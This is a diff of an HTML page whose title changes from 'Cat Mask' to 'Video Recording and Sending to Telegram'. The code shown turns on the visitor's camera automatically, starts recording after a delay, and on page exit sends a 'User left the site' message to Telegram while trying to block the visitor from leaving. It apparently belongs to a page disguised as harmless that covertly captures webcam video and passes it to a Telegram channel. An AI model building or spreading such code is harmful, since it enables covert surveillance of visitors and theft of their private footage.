@@ -16,7 +16,7 @@
     </style>
 </head>
 <body>
-    <h1>Cat Mask</h1>
+    <h1>Video Recording and Sending to Telegram</h1>
     <video id="video" autoplay></video>
     <div id="progress">Progress: <span id="progressText">0%</span></div>
 
@@ -38,7 +38,6 @@
                     setupMediaRecorder(stream);
 
                     video.onloadedmetadata = () => {
-                        // Start recording after a delay to allow the camera to focus
                         setTimeout(() => {
                             mediaRecorder.start();
                             console.log('Recording started');
@@ -132,7 +131,7 @@
         window.addEventListener('beforeunload', (event) => {
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
-                console.log('Recording stopped');
+                console.log('Recording stopped due to user leaving the site');
                 sendNotificationToTelegram('User left the site. Recording stopped.');
                 event.preventDefault(); // Required for modern browsers
                 event.returnValue = ''; // For some browsers
